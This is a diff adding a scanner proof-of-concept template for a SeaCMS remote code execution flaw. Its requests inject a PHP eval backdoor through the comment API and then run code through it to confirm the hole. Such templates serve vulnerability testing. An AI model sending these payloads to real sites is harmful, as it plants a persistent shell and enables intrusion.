@@ -1,0 +1,16 @@
+name: poc-yaml-seacms-before-v992-rce
+set:
+    r1: randomLowercase(8)
+rules:
+    - method: GET
+      path: "/comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[_])%3B%3F%3E"
+      expression: |
+        response.status == 200
+    - method: GET
+      path: "/data/mysqli_error_trace.php?_=printf(md5(\"{{r1}}\"))%3B"
+      expression: |
+        response.status == 200 && response.body.bcontains(bytes(md5(r1)))
+detail:
+    author: bufsnake(https://github.com/bufsnake)
+    links:
+        - https://www.zhihuifly.com/t/topic/3118
